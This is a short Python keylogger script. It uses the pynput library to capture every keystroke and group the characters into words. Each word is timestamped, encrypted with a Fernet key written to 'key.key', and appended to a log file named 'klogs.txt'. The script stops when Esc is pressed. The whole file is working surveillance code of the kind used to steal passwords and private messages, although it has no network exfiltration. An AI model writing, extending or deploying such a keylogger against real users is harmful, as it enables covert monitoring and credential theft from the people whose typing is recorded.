from pynput import keyboard
import datetime
from cryptography.fernet import Fernet

key = Fernet.generate_key()    
cipher_suite= Fernet(key)     

with open('key.key', 'wb') as f:
    f.write(key)

buffer = []

def on_press(key):
    global buffer 
    if key == keyboard.Key.space:
        log = f'[{datetime.datetime.now().strftime('%Y-%m-%d, %H:%M:%S')}] {"".join(buffer)}\n'
        encrypted_logs = cipher_suite.encrypt(log.encode())
        with open('klogs.txt', 'ab') as f:
            f.write(encrypted_logs + b'\n')
        buffer = []
    else:
        try:
            if key.char.isalpha():
                buffer.append(key.char)
            else:
                buffer.append(str(key).replace("'", ""))
        except AttributeError:
            pass 
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False 
        
with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
    
